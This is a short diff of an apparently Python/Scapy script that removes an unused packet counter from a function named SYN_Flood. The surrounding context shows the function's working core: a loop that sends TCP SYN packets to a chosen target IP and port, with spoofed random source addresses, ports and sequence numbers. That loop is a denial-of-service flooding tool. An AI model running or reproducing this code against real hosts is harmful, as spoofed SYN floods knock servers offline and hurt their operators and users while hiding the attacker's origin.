@@ -18,7 +18,6 @@ def Args():
 def SYN_Flood(Target_IP,dPort,packets_to_send):
     MAX_PORTS = 65535
     print("Sending packets...")
-    counter = 0
     for i in range(packets_to_send):
         seq_n = random.randint(0,MAX_PORTS)
         sPort = random.randint(0,MAX_PORTS)
@@ -26,7 +25,6 @@ def SYN_Flood(Target_IP,dPort,packets_to_send):
         src_IP = random_IP()
         packet = IP(dst=Target_IP,src=src_IP)/TCP(sport=sPort,dport=dPort,flags="S",seq=seq_n,window=Window)
         send(packet,verbose=0)
-        counter += 1
     print("Finished!")
 
 def main():
